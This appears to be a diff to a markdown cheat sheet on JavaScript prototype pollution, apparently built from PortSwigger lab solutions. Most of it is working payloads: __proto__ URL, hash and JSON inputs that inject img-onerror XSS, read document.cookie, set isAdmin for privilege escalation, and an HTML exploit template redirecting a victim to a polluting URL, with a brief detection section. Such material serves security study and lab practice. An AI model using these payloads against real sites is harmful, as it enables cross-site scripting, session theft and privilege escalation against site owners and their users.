@@ -1,55 +1,100 @@
-# Prototype Pollution - Payload Reference
+# Prototype Pollution Attack Techniques
+
+## What is Prototype Pollution?
+JavaScript objects inherit from Object.prototype. Polluting the prototype affects ALL objects.
+
+## PortSwigger Lab Solutions
+
+### Lab: Client-side prototype pollution via browser APIs
+**Approach**: Pollute Object.prototype to control DOM sinks
+
+**Payload** (via URL):
+```
+https://TARGET/?__proto__[innerHTML]=<img/src/onerror=alert(1)>
+```
+
+**Payload** (via hash):
+```
+https://TARGET/#__proto__[innerHTML]=<img/src/onerror=alert(1)>
+```
+
+### Lab: DOM XSS via client-side prototype pollution
+**Approach**: Pollute sink used by vulnerable library
+
+**Step 1**: Find prototype pollution source
+```
+/?__proto__[foo]=bar
+# Check if {}.foo === "bar" in console
+```
+
+**Step 2**: Find DOM sink
+```
+// innerHTML, document.write, eval
+```
+
+**Step 3**: Combine
+```
+/?__proto__[innerHTML]=<img/src/onerror=alert(document.cookie)>
+```
+
+## Common Sources
+```
+# URL parameters
+/?__proto__[key]=value
+/?constructor[prototype][key]=value
+
+# URL hash
+/#__proto__[key]=value
+
+# JSON body
+{"__proto__": {"key": "value"}}
+
+# URL parsing flaws
+/?__proto__[key]=value
+```
+
+## Common Sinks
+```
+# innerHTML
+__proto__[innerHTML]=<img/src/onerror=alert(1)>
+
+# eval
+__proto__[src]=data:,alert(1)
+
+# jQuery
+__proto__[url]=javascript:alert(1)
+
+# Document manipulation
+__proto__[cookie]=stolen
+
+# Settings override
+__proto__[isAdmin]=true
+```
+
+## Detection
+```javascript
+// Check if prototype pollution is possible
+location.search.includes("__proto__") || location.hash.includes("__proto__")
+
+// Manual test
+var a = {};
+console.log(a.polluted); // undefined
+// After pollution:
+// Object.prototype.polluted = "yes"
+console.log(a.polluted); // "yes"
+```
+
+## Exploit Template
+```html
+<script>
+// Pollute via fetch or redirect
+document.location = "https://TARGET/?__proto__[innerHTML]=<img/src/onerror=alert(document.cookie)>";
+</script>
+```
 
 ## Server-Side Prototype Pollution
-
-### Detection
 ```json
-{"__proto__": {"isAdmin": true}}
-{"constructor": {"prototype": {"isAdmin": true}}}
+POST /api/user HTTP/1.1
+{"username":"wiener","__proto__":{"isAdmin":true}}
+# If server merges without sanitization, all objects get isAdmin=true
 ```
-
-### Via JSON Body
-```json
-POST /api/update
-{"name": "test", "__proto__": {"role": "admin"}}
-```
-
-### Via Query Parameter
-```
-GET /api?__proto__[role]=admin
-GET /api?constructor[prototype][role]=admin
-```
-
-## Client-Side Prototype Pollution
-
-### DOM XSS via Prototype Pollution
-```javascript
-// Pollute Object.prototype
-{"__proto__": {"innerHTML": "<img src=x onerror=alert(1)>"}}
-
-// When app does: element[prop] = value
-// It reads polluted innerHTML → XSS
-```
-
-### Gadget Chains
-```javascript
-// jQuery sink
-{"__proto__": {"selector": "<img src=x onerror=alert(1)>"}}
-
-// React
-{"__proto__": {"dangerouslySetInnerHTML": {"__html": "<img src=x onerror=alert(1)>"}}}
-```
-
-## PortSwigger Lab Approach
-1. Send JSON with `__proto__` property
-2. Check if response reflects the polluted property
-3. If reflected → server-side prototype pollution confirmed
-4. Look for gadgets (settings, config objects) that can be polluted
-5. Chain with XSS or other vulnerabilities
-
-## Detection Checklist
-- [ ] Can you add `__proto__` to JSON body?
-- [ ] Is it reflected in response?
-- [ ] Does it persist (stored)?
-- [ ] Can you pollute `constructor.prototype`?
-- [ ] Are there client-side gadgets?
